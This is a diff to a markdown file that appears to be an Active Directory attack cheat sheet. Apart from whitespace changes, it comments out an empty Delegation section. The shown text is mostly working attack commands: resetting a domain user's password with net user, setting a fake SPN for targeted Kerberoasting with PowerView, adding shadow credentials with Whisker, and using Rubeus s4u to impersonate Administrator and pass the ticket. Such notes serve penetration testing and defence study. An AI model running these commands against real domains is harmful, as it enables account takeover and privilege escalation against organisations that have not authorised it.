@@ -8,12 +8,14 @@ Lets discuss the various permissions and how these can be abused:
 ## GenericAll, GenericWrite, GenericProperty
 
 ### When these permissions are assigned to a **user**:
+
 Change password of a user object.
 ```
 net user<username> <password>  /domain
 ```
 
 Targeted Kerberoasting ( Three steps )
+
 1.  Set SPN
 ```
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
@@ -329,18 +331,20 @@ Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTR
 ```
 
 We can also validate whether the shadow credentials were added:
+
 ```
 Get-DomainComputer -Identity us-helpdesk
 ```
 
 Request TGS with Hash
+
 ```
 Rubeus.exe s4u /self /impersonateuser:Administrator /dc:us-dc.techcorp.local /ptt /ticket:doIGtd[.*]TLsb2NhbA== /altservice:cifs/us-helpdesk.us.techcorp.local
 ```
 
 The output of Rubeus would contain the base64 TGT which can injected into a session via PTT.
 
-# Delegation
+<!-- # Delegation
 
 ## Unconstrained
 
@@ -349,7 +353,7 @@ The output of Rubeus would contain the base64 TGT which can injected into a sess
 ## Constrained Delegation ( With Kerberos )
 
 ## Resource Based Constrained Delegation
-
+ -->
 
 
 
